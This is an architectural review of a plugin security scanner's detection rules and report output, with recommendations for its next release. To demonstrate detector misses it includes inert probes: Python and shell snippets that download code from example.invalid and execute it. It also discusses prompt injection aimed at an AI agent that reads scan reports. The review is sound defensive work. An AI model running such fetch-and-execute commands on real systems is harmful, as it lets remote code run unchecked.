# Rule detection and review clarity assessment

Date: 2026-09-06. Reviewed source: `92ed9c635aace1b332074060c0881ab6e67d957e`
(v0.2.3, rule catalog 7). Scope: rule architecture, detector predicates,
evidence, and CLI/agent consumption. This is a direct architectural review,
not an exhaustive vulnerability scan or an assessment of a particular plugin.
Recommendations target [v0.2.4](../plans/v0.2.4-rule-detection-clarity.md).
No detector or release version was changed during this review.

The best improvement is to make each reported behavior demonstrable and each
unresolved behavior visible. More keywords alone would increase both noise and
misses. Prioritize accurate predicates, explicit source-to-sink evidence, and a
short report that helps a reader decide what needs inspection next.

## What should remain

- Separate capabilities from suspicious findings, and severity from enforcement.
- Preserve immutable acquisition, inert source ingestion, bounded analysis,
  explicit payload coverage, and exact source/policy identities.
- Preserve highest-severity-first finding ordering and exact report omission
  counts. These already exist; the improvement is diversity within that budget.
- Keep candidate review independent from installation, trust, and suppression.
- Keep the rule-family blocking set empty until supporting evidence is adequate.
  Hardened coverage/identity/payload/postcondition checks remain independent.
- Describe static findings as evidence about possible behavior. They do not prove
  runtime execution, malicious intent, user consent, or a plugin's safety.

## Verified observations and priorities

P1 here means a priority for v0.2.4 detection or interpretation correctness;
P2 means an additional review-quality improvement. These are engineering
priorities, not vulnerability severity ratings.

### R1 — P1: Python co-occurrence both overreports and misses execution chains

In [`analyze_script_unit`](../../crates/omasafe-analyzer/src/detect/script/mod.rs),
`python_fetch_to_exec` requires fetch-related and execution-related spellings
on the same physical line. It does not connect the returned bytes to the
execution argument. Python dispatch also processes physical lines separately.

Two inert probes confirm the consequence:

```python
# Incorrect High oma.python.download-execute finding:
import requests, subprocess
requests.get("https://example.invalid/status"); subprocess.run(["date"])
```

```python
# Missing oma.python.download-execute finding:
import requests
payload = requests.get("https://example.invalid/code").text
exec(payload)
```

The positive inline control `exec(requests.get(...).text)` is detected. A
correct implementation must distinguish all three. Use bounded local value
provenance, including overwrites, scopes, and supported aliases; unknown calls
or transformations remain unresolved. Do not silently turn co-occurrence into
a connected-execution finding. The current Python payload is correctly marked
`partial`, but its `analysis.coverage_limitations` is empty in these probes.
An agent inspecting only the analysis object can therefore overlook the gap.

### R2 — P1: staged shell execution incorrectly depends on chmod

[`analyze_staged_script_chain`](../../crates/omasafe-analyzer/src/detect/script/mod.rs)
tracks literal download paths but emits only after `chmod_x` becomes true.
An interpreter does not require execute permission on a script it reads.

```sh
# Missing oma.script.download-execute finding:
curl -o /tmp/omasafe-review-stage.sh https://example.invalid/code
sh /tmp/omasafe-review-stage.sh
```

Adding `chmod +x /tmp/omasafe-review-stage.sh` between these statements makes
the finding appear. Both probes disclose an absolute-reference coverage gap;
that useful disclosure does not explain the download-to-interpreter behavior.

Track downloaded bytes reaching an interpreter's script operand independently
from direct file execution. Model command modes, path overwrites, failed fetches,
and control flow using the existing shell representation. A textual path match
alone must not connect stale or unrelated file contents. Shell grammar work
already exists under `detect/shell/`; extend it rather than adding another
independent substring pass.

### R3 — P1: trigger claims and evidence confidence exceed the detector evidence

[`apply_h6_user_data_observations`](../../crates/omasafe-analyzer/src/detect.rs)
is a separate line-oriented pass, even in a parser-enabled QML build. Its
findings inherit `outcome.confidence`. Consequently, a lexical conclusion can
be rendered as `ast-backed`.

Two QML probes, each inside a multiline `MouseArea.onClicked` handler, confirm
the additional predicate mismatch:

```javascript
// An unrelated request causes a background-capture finding:
Quickshell.execDetached(["grim", "/tmp/capture.png"]); var xhr = new XMLHttpRequest(); xhr.open("GET", "https://example.invalid/status"); xhr.send();
```

```javascript
// An interactive dynamic argument causes a background-input finding:
Quickshell.execDetached(["wtype", userInput]);
```

Both findings report `ast-backed` confidence. The first emits
`oma.qml.screen-capture-background`; the second emits
`oma.qml.input-injection-background`. The input probe declares `userInput`
as a string property. An interactive capture without the request is a negative
control and does not emit the background rule.

The code allows `egress` alone to trigger background capture, and a dynamic
argument alone to trigger background input. Neither proves a background
trigger. Neither the click handler nor a static parse proves informed consent,
but that uncertainty also does not establish background execution.

Require trigger evidence for the existing background rule meanings. Dynamic
input and capture-to-network behavior need separately defined predicates and,
if published as findings, separate IDs. Attribute analysis method per finding;
the presence of a parser elsewhere in the file is insufficient.

### R4 — P1: catalog prose conflates evidence, risk, and policy

[`rules.rs`](../../crates/omasafe-analyzer/src/rules.rs) contains guidance such
as “treat as blocking” for download-execute/reverse-shell families, while the
[admission report](../reports/h8b-blocking-admission.md) admits no family.
Some summaries still describe a single-line detector or refer to H4 as future
work even though subsequent analysis exists. Python privilege guidance also
mentions wrapper invocation while the detector requires a write/grant context.

Audit every emitted rule against its current predicate. Each explanation
should say: what was observed, why it matters, what was not established, and
what exact source or destination the reviewer should inspect. Put lifecycle
blocking eligibility and the current operation's outcome in policy fields,
not in generic rule prose. Do not use “hidden,” “exfiltration,” or
“attacker-controlled” where the evidence only establishes capability,
transmission, or a writable location.

Preserve published rule meanings. Fix an emitter that violates its existing
meaning; introduce a new ID for a genuinely different predicate. Catalog and
severity identity changes must follow the existing versioning contract.

### R5 — P1: findings lack the structured evidence needed to verify the claim

[`RenderedFinding`](../../crates/omasafe-report/src/analysis.rs) has one
location, a bounded evidence string, catalog explanation, and catalog guidance.
Some observed evidence is only `download-execute`, `sensitive-read-to-egress`,
or `background-screen-capture`. It does not identify the producer, transfer,
sink argument, trigger, destination, or unresolved links.

Add bounded, typed evidence steps with locations and explicit unknowns.
Start with the predicates fixed in R1–R3. Do not manufacture a complete chain
for lexical indicators. Distinguish the method used to obtain evidence from
certainty about the behavior; neither is a probability of malicious intent.

[`InvocationEdge`](../../crates/omasafe-report/src/analysis.rs) represents a
literal file reference. Its existence must not be interpreted as verified
runtime reachability, cross-file dataflow, or proof that a script ran.

### R6 — P1: report completeness is spread across multiple objects

The [CLI report renderer](../../crates/omasafe-cli/src/main.rs) includes payload
coverage and analysis limitations separately. The review profile removes all
payload entries and records exact omissions. Text output prints up to 200
inventory entries before findings, then reduces evidence to 80 characters;
it does not render each finding's explanation or review guidance.

[`EquivalenceSummary`](../../crates/omasafe-report/src/analysis.rs) contains
version metadata only. `rules coverage` exposes the actual gaps separately.
The embedded map currently lists `cargo-git-unpinned`,
`remote-git-execution-unpinned`, and `remote-build` as not covered. These are
pinned-map facts, not a claim about today's upstream baseline.

Provide a common review summary before inventory: exact reviewed identity,
freshness, finding totals by severity, capability changes when a comparable
baseline exists, consequential coverage gaps, suppressions, and presentation
omissions. Keep analysis incompleteness separate from report shortening;
omitting already-analyzed inventory rows is not an analysis failure. Likewise,
unsupported inert metadata should not be presented like an unresolved code load.

The current severity sort already protects higher-severity results from lower
ones. Within a severity band, however, a large set in an early-sorting path
can consume the prefix budget. Reserve representation across rule families
and files, retain full pre-truncation totals, and expose a route to remaining
evidence. This is a source-confirmed presentation design risk; no report-flood
exploit was reproduced in this review.

### R7 — P2: expand assurance from syntax regressions to behavior coverage

The repository has extensive shell regression tests. The independent
[`ground-truth.json`](../../fixtures/corpus/expectations/ground-truth.json)
measurement, however, contains 11 cases and does not cover every High family.
The pinned disposition ledger has eight records; the admission report correctly
declines to substitute fixture results for real-plugin High-family precision.

[`run-corpus.py`](../../scripts/run-corpus.py) applies a disposition keyed by
`{plugin_id, commit, rule_id}` to each matching occurrence. Different occurrences
of the same rule in one revision can therefore share a label despite differing
correctness. Move new triage records to occurrence-level evidence identities,
and mark ambiguous legacy records for review instead of inventing precision.

Publish sample sizes, independent plugin/revision counts, untriaged and
incomplete cases, and coverage by family, language, and analysis method. Add
positive/negative pairs, benign overwrites, aliasing, syntax variations, and
bound exhaustion. Measure labeled fixture detection separately from precision;
neither establishes ecosystem recall. Do not weaken admission requirements
or infer adequate evidence from a single true positive.

### R8 — P2: plugin text must stay untrusted when an AI reads a report

Structured JSON does not make an embedded source excerpt trustworthy.
Repository comments, paths, descriptions, and URLs can contain instructions
aimed at the reviewing agent. Current text escaping handles many controls;
it is not an AI instruction boundary or general secret redaction.

Keep scanner-authored explanations separate from source-derived evidence.
Label the latter as untrusted data, display it literally, escape misleading
terminal/Unicode controls, redact credential-bearing URL/userinfo/header values,
and disclose truncation/redaction. Preserve enough destination context to review
the behavior. Do not let evidence become a command, clickable action, fetched
URL, suppression, or permission to install. No keyword detector can certify
that prompt injection is absent.

This recommendation follows [OWASP's repository-input guidance](https://cheatsheetseries.owasp.org/cheatsheets/Secure_Coding_with_AI_Cheat_Sheet.html)
and [prompt-injection guidance](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html).
The proposed evidence paths are consistent with
[CodeQL's source-to-sink path presentation](https://codeql.github.com/docs/writing-codeql-queries/creating-path-queries/);
these references motivate the design, not a requirement to adopt CodeQL.

## Verification and limits

Built current source with `cargo build -p omasafe-cli --offline` and ran nine
local, inert `scan-plugin --path DIR --format json` probes with isolated XDG
directories. No fixture was executed, imported, installed, or enabled; URLs
use `example.invalid`. The build used the default QML parser feature.

The checked-in [probe record](2026-09-06-rule-review-probes.json) contains the
complete fixture inputs and observed finding/coverage subsets. It includes
controls as well as the failing cases; observations describe v0.2.3, not
expected v0.2.4 behavior. Recreate each record's files and scan the containing
directory to reproduce. Future regression tests must assert the corrected
expectations in the release plan, rather than freeze the observed defects.

This review did not rerun the full corpus, validate live runtime reachability,
exercise the sibling UI, or measure detection recall. The false-negative probes
retain partial/limited coverage; they do not demonstrate a “safe” verdict or a
bypass of the independent hardened coverage gate.
